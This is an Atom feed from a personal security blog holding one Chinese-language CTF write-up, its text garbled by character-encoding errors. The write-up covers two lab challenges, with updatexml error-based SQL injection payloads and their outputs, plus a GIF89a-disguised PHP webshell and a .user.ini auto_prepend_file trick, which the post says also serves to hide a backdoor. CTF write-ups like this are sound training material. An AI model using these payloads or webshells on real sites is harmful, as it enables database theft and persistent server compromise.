<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kanyun&#39;s Blog</title>
  
  
  <link href="https://kannikanyun.github.io/atom.xml" rel="self"/>
  
  <link href="https://kannikanyun.github.io/"/>
  <updated>2022-06-28T03:23:06.839Z</updated>
  <id>https://kannikanyun.github.io/</id>
  
  <author>
    <name>kanyun</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUåˆ·é¢˜è®°4</title>
    <link href="https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/"/>
    <id>https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/</id>
    <published>2022-06-27T09:47:28.000Z</published>
    <updated>2022-06-28T03:23:06.839Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š"><a href="#é¢˜ç›®ç¯å¢ƒï¼š" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271421152.png" alt="image-20220627142124035"></p><h2 id="è§£é¢˜æ€è·¯ï¼š"><a href="#è§£é¢˜æ€è·¯ï¼š" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h2><h3 id="ä¸‡èƒ½å¯†ç ï¼š"><a href="#ä¸‡èƒ½å¯†ç ï¼š" class="headerlink" title="ä¸‡èƒ½å¯†ç ï¼š"></a>ä¸‡èƒ½å¯†ç ï¼š</h3><pre class="line-numbers language-none"><code class="language-none">1&#39; or 1&#x3D;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271425867.png" alt="image-20220627142554763"></p><p>è¿‡æ»¤äº†andã€=ã€ç©ºæ ¼ã€unionã€åŒå†™  ç­‰</p><h3 id="å°è¯•æŠ¥é”™æ³¨å…¥ï¼š"><a href="#å°è¯•æŠ¥é”™æ³¨å…¥ï¼š" class="headerlink" title="å°è¯•æŠ¥é”™æ³¨å…¥ï¼š"></a>å°è¯•æŠ¥é”™æ³¨å…¥ï¼š</h3><h4 id="æŠ¥é”™æ³¨å…¥ä½¿ç”¨åœºæ™¯"><a href="#æŠ¥é”™æ³¨å…¥ä½¿ç”¨åœºæ™¯" class="headerlink" title="æŠ¥é”™æ³¨å…¥ä½¿ç”¨åœºæ™¯"></a>æŠ¥é”™æ³¨å…¥ä½¿ç”¨åœºæ™¯</h4><ul><li><p>é€‚åˆæ— ç›´æ¥å›æ˜¾çš„sqlæ³¨å…¥ï¼Œå­˜åœ¨æŠ¥é”™é¡µé¢çš„å›æ˜¾</p><blockquote><blockquote><p>æœ‰ä¸¤ä¸ªæŠ¥é”™æ³¨å…¥å‡½æ•°ï¼š</p><ol><li>extractvalue()</li><li>updatexml()</li></ol></blockquote></blockquote><h5 id="ä¸€ã€extractvalueå‡½æ•°"><a href="#ä¸€ã€extractvalueå‡½æ•°" class="headerlink" title="ä¸€ã€extractvalueå‡½æ•°"></a>ä¸€ã€extractvalueå‡½æ•°</h5><p>1.å‡½æ•°å«ä¹‰ï¼š ä½¿ç”¨ XPath è¡¨ç¤ºæ³•ä» XML å­—ç¬¦ä¸²ä¸­æå–å€¼ï¼Œå³è¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>2.ç”¨æ³•</p><ul><li>ExtractValue(xml_frag, xpath_expr)<br>ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼š<br>(1). xml_frag: XML æ ‡è®°ç‰‡æ®µï¼Œxmlè¯­è¨€çš„æ ‡ç­¾é—­åˆå†…çš„å€¼ï¼Œ<br>(2). xpath_expr: XPath è¡¨è¾¾å¼ï¼ŒåŒ¹é…xmlæ ‡ç­¾å†…çš„å€¼å¹¶è¿”å›ã€‚<br>ä¾‹å¦‚ï¼Œ</li></ul><pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;a&#39;) AS val1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>val1çš„å€¼ä¸ºcccï¼Œè€Œä¸ä¸ºdddï¼Œå› ä¸ºaæ ‡ç­¾ä¸­é—­åˆçš„æ˜¯cccï¼Œ<br>è‹¥æ˜¯æƒ³åŒ¹é…å€¼ä¸ºdddï¼Œåˆ™å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">ExtractValue(&#39;&lt;a&gt;ccc&lt;b&gt;ddd&lt;&#x2F;b&gt;&lt;&#x2F;a&gt;&#39;, &#39;&#x2F;&#x2F;b&#39;) AS val2;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­¤æ—¶val2çš„å€¼ä¸ºdddã€‚</p><p>3.æŠ¥é”™æ³¨å…¥ä½¿ç”¨åœºæ™¯</p><ul><li>é€‚åˆæ— ç›´æ¥å›æ˜¾çš„sqlæ³¨å…¥ï¼Œå­˜åœ¨æŠ¥é”™é¡µé¢çš„å›æ˜¾</li></ul><p>4.æŠ¥é”™çš„åŸå› </p><blockquote><p>ExtractValueå‡½æ•°ä¸­çš„ä¸¤ä¸ªå‚æ•°ï¼Œå¾—æ˜¯xpathè¯­æ³•æ‰ä¼šæ­£å¸¸å›æ˜¾ï¼Œå¦‚æœä¸æ˜¯xpathè¯­æ³•ï¼Œåˆ™ä¼šæŠ¥é”™å¹¶å›æ˜¾ã€‚</p></blockquote><blockquote><blockquote><p>extractvalueæŠ¥é”™ä¼šè¿”å›å…¶ä¸­çš„sqlè¯­å¥ç»“æœã€‚</p></blockquote></blockquote><p>5.é…åˆå‡½æ•°<br>åŸå› ï¼šæŠ¥é”™æ³¨å…¥ä¼šé™åˆ¶æ•°æ®åº“å†…å®¹ä¸è¶…è¿‡32å­—èŠ‚ï¼Œæ‰€ä»¥çµæ´»ä½¿ç”¨ä¸€äº›å‡½æ•°æ¥æˆªå–æ•°æ®å†…å®¹ï¼Œæœ€åå†è¿›è¡Œæ‹¼æ¥ã€‚</p><ul><li>midå‡½æ•°ï¼š è¿”å›ä»æŒ‡å®šä½ç½®å¼€å§‹çš„å­å­—ç¬¦ä¸²</li><li>substrå‡½æ•°ï¼šè¿”å›æŒ‡å®šçš„å­å­—ç¬¦ä¸²</li><li>concatå‡½æ•°ï¼š è¿”å›è¿æ¥çš„å­—ç¬¦ä¸²</li></ul><p>6.å¸¸ç”¨peayloadï¼š<br>ä¾‹å­ï¼šCVE-2020-5504 phpmyadminçš„åå°sqlæ³¨å…¥ï¼ˆç‹—å¤´ä¿å‘½ï¼Œéƒ½sqlçš„ç®¡ç†åå°äº†ï¼Œè¿˜åœ¨è¿™æ³¨å…¥å‘¢ï¼‰</p><ul><li>æ•°æ®åº“</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æˆ‘ä»¬é€‰æ‹©ï¼š"><a href="#æˆ‘ä»¬é€‰æ‹©ï¼š" class="headerlink" title="æˆ‘ä»¬é€‰æ‹©ï¼š"></a>æˆ‘ä»¬é€‰æ‹©ï¼š</h3></li></ul><blockquote><p>ä½¿ç”¨updatexmlæŠ¥é”™æ³¨å…¥</p></blockquote><p><code>updatexml</code>å‡½æ•°ä¸<code>extractvalue</code>å‡½æ•°ç”¨æ³•ä¸€æ ·</p><pre class="line-numbers language-none"><code class="language-none">updatexml(a,b,c)ï¼Œæ­¤å‡½æ•°aï¼Œcå¿…é¡»ä¸ºStringç±»å‹ï¼Œå› æ­¤å¯ä»¥ä½¿a,cä¸ä¸ºStringå‹è¿›è¡ŒæŠ¥é”™<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Payload1-æŸ¥çœ‹ç‰ˆæœ¬"><a href="#Payload1-æŸ¥çœ‹ç‰ˆæœ¬" class="headerlink" title="Payload1(æŸ¥çœ‹ç‰ˆæœ¬):"></a>Payload1(æŸ¥çœ‹ç‰ˆæœ¬):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~10.3.18-MariaDB~&#39;</code></p></blockquote><h4 id="Payload2-çˆ†åº“"><a href="#Payload2-çˆ†åº“" class="headerlink" title="Payload2(çˆ†åº“):"></a>Payload2(çˆ†åº“):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~geek~&#39;</code></p></blockquote><h4 id="Payload3-çˆ†è¡¨"><a href="#Payload3-çˆ†è¡¨" class="headerlink" title="Payload3(çˆ†è¡¨):"></a>Payload3(çˆ†è¡¨):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~H4rDsq1~&#39;</code></p></blockquote><h4 id="Payload4-çˆ†å­—æ®µå"><a href="#Payload4-çˆ†å­—æ®µå" class="headerlink" title="Payload4(çˆ†å­—æ®µå):"></a>Payload4(çˆ†å­—æ®µå):</h4><p><code>username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23</code><br><code>&amp;password=21</code></p><blockquote><p><code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p></blockquote><h4 id="Payload5-çˆ†å­—æ®µå€¼"><a href="#Payload5-çˆ†å­—æ®µå€¼" class="headerlink" title="Payload5(çˆ†å­—æ®µå€¼):"></a>Payload5(çˆ†å­—æ®µå€¼):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(username,&#39;--&#39;,password))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~flag--flag&#123;a007ebd8-50c7-495f-b&#39;</code></p></blockquote><blockquote><blockquote><p>flagå¹¶æ²¡æœ‰å®Œå…¨æ˜¾ç¤º</p></blockquote></blockquote><blockquote><p>right()æŸ¥è¯¢ååŠæ®µ</p><h2 id="RIGHT-str-len"><a href="#RIGHT-str-len" class="headerlink" title="RIGHT(str,len)"></a>RIGHT(str,len)</h2><p>â€‹    è¿”å›æœ€å³ä¾§çš„nä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²strï¼Œæˆ–NULLå¦‚æœä»»ä½•å‚æ•°æ˜¯NULL                                                     </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SQL</span><span class="token operator">></span> <span class="token keyword">SELECT</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token operator">|</span> <span class="token keyword">RIGHT</span><span class="token punctuation">(</span><span class="token string">'foobarbar'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>                                   <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token operator">|</span> rbar                                                    <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---------------------------------------------------------+</span><span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="Payload6-æŸ¥å³åŠæ®µflag"><a href="#Payload6-æŸ¥å³åŠæ®µflag" class="headerlink" title="Payload6(æŸ¥å³åŠæ®µflag):"></a>Payload6(æŸ¥å³åŠæ®µflag):</h4><p><code>username=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))%23&amp;password=1</code></p><blockquote><p><code>XPATH syntax error: &#39;~8-50c7-495f-b702-058e970280f2&#125;~&#39;</code></p></blockquote><h4 id="flagæ‹¼æ¥å¾—ï¼š"><a href="#flagæ‹¼æ¥å¾—ï¼š" class="headerlink" title="flagæ‹¼æ¥å¾—ï¼š"></a>flagæ‹¼æ¥å¾—ï¼š</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>a007ebd8<span class="token operator">-</span><span class="token number">50</span>c7<span class="token operator">-</span><span class="token number">495</span>f<span class="token operator">-</span>b702<span class="token operator">-</span><span class="token number">058e970280</span>f2<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><ol><li><p>åœ¨æ— å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œé€‰æ‹©æŠ¥é”™æ³¨å…¥â€”-updatexml()</p></li><li><blockquote><p>åŸå› ï¼šæ ¼å¼ç®€å•ğŸ˜‚</p></blockquote></li><li><p>åœ¨GETä¼ å‚æ—¶æ³¨æ„  <code>&#39;</code>  â€“&gt;%27  ã€  <code>#</code>  â€“&gt; %23</p></li><li><p>sqlä¸­çš„right()å‡½æ•°ï¼Œå¯ä»å³æ˜¾ç¤ºå­—æ®µå€¼</p></li></ol><hr><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š-1"><a href="#é¢˜ç›®ç¯å¢ƒï¼š-1" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271911961.png" alt="image-20220627191110906"></p><p>æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç•Œé¢ï¼Œå¾ˆæ˜æ˜¾è¿™æ˜¯å…³äº<strong>æ–‡ä»¶ä¸Šä¼ æ¼æ´</strong>æ–¹é¢çš„é¢˜ç›®ã€‚</p><h2 id="è§£é¢˜æ€è·¯ï¼š-1"><a href="#è§£é¢˜æ€è·¯ï¼š-1" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h2><h3 id="å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼š"><a href="#å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼š" class="headerlink" title="å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼š"></a>å°è¯•ä¸€å¥è¯æœ¨é©¬ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206271945574.png" alt="image-20220627194516522"></p><blockquote><p>æç¤ºï¼š<u><em><strong>éæ³•çš„åç¼€</strong></em></u></p></blockquote><h3 id="å°è¯•ç»•è¿‡-lt-çš„å›¾ç‰‡é©¬ï¼š"><a href="#å°è¯•ç»•è¿‡-lt-çš„å›¾ç‰‡é©¬ï¼š" class="headerlink" title="å°è¯•ç»•è¿‡&lt;?çš„å›¾ç‰‡é©¬ï¼š"></a>å°è¯•ç»•è¿‡&lt;?çš„å›¾ç‰‡é©¬ï¼š</h3><blockquote><p><code>&lt;? in contents!</code></p></blockquote><blockquote><p> æç¤ºåŒ…å«äº†&lt;?   ,   è¡¨ç¤ºè¿‡æ»¤äº†å«æœ‰â€œ&lt;?â€çš„æ–‡ä»¶</p></blockquote><h3 id="å°è¯•ç»•è¿‡-lt"><a href="#å°è¯•ç»•è¿‡-lt" class="headerlink" title="å°è¯•ç»•è¿‡&lt;?"></a>å°è¯•ç»•è¿‡&lt;?</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å›æ˜¾ï¼š<code>exif_imagetype:not image!</code></p></blockquote><h3 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype"></a>exif_imagetype</h3><blockquote><ol><li><p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p></li><li><p>exif_imagetype â€” åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹</p><p><em><strong><u>è¯´æ˜:</u></strong></em></p></li><li><p>exif_imagetype ( string $filename ) : int</p></li><li><p>exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚</p></li><li><p><u><em><strong>è¯´æ˜é¢˜ç›®åç«¯ä¼šæˆªå–ä¸Šä¼ çš„æ–‡ä»¶çš„å¤´éƒ¨ä¸€éƒ¨åˆ†è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºå›¾åƒæ–‡ä»¶</strong></em></u></p></li></ol></blockquote><h3 id="GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ï¼Œ"><a href="#GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ï¼Œ" class="headerlink" title="GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ï¼Œ"></a><strong>GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—ï¼Œ</strong></h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> å›æ˜¾ï¼š</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fdYour files <span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><blockquote><p>å›¾ç‰‡é©¬æ˜¯ä¸Šå»å•¦ï¼Œä½†æ˜¯æœåŠ¡å™¨å¹¶ä¸ä¼šæ‰§è¡Œé‡Œé¢çš„ä»£ç </p></blockquote></blockquote><blockquote><p>å› æ­¤è¿™é‡Œæ¶‰åŠå¦ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p></blockquote><h3 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong></h3><h4 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h4><p>Phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹ï¼ˆä¸‹å›¾ç¬¬ä¸€ã€å››ä¸ªï¼‰ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210205232411887.png" alt="img"></p><ol><li><blockquote><p>auto_prepend_fileï¼ŒæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶*<u><strong>å‰</strong></u>*ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p></blockquote></li><li><blockquote><p>```ini<br>GIF89a                  //ç»•è¿‡exif_imagetype()<br>auto_prepend_file=a.jpg //æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æçš„æ–‡ä»¶çš„åç§°ï¼Œå¹¶åŒ…å«è¯¥æ–‡ä»¶ï¼Œå°±åƒä½¿ç”¨requireå‡½æ•°è°ƒç”¨å®ƒä¸€æ ·ã€‚<br>auto_append_file=a.jpg  //è§£æåè¿›è¡ŒåŒ…å«</p><pre class="line-numbers language-none"><code class="language-none">&#96;GIF89a.png&#96;æ˜¯è¦åŒ…å«çš„æ–‡ä»¶ã€‚3. &gt; å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚&gt; ä¼˜åŠ¿ï¼šè·Ÿ&#96;.htaccess&#96;åé—¨æ¯”ï¼Œé€‚ç”¨èŒƒå›´æ›´å¹¿ï¼Œnginx&#x2F;apache&#x2F;IISéƒ½æœ‰æ•ˆï¼Œè€Œ&#96;.htaccess&#96;åªé€‚ç”¨äºapache#### ä½¿ç”¨åœºæ™¯ï¼š**æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚ å†æ¯”å¦‚ï¼Œä½ åªæ˜¯æƒ³éšè—ä¸ªåé—¨ï¼Œè¿™ä¸ªæ–¹å¼æ˜¯æœ€æ–¹ä¾¿çš„ã€‚**### Payload1:ä¸Šä¼ user.ini&#96;&#96;&#96;iniGIF89aauto_prepend_file&#x3D;GIF89a.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li></ol><blockquote><p>å‰é¢åŠ GIF89aï¼Œæ¥ç»•è¿‡æ£€æµ‹</p></blockquote><p>å›æ˜¾ï¼š</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fd Your files <span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".user.ini"</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="Payload2-ä¸Šä¼ GIF89a-png"><a href="#Payload2-ä¸Šä¼ GIF89a-png" class="headerlink" title="Payload2:ä¸Šä¼ GIF89a.png"></a>Payload2:ä¸Šä¼ GIF89a.png</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å›æ˜¾ï¼š</p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fdYour files <span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><blockquote><blockquote><p>æ­¤æ—¶<code>index.php</code>å°±æ´¾ä¸Šäº†ç”¨åœº(è¾…åŠ©æ‰§è¡Œæœ¨é©¬)</p></blockquote></blockquote></blockquote><h3 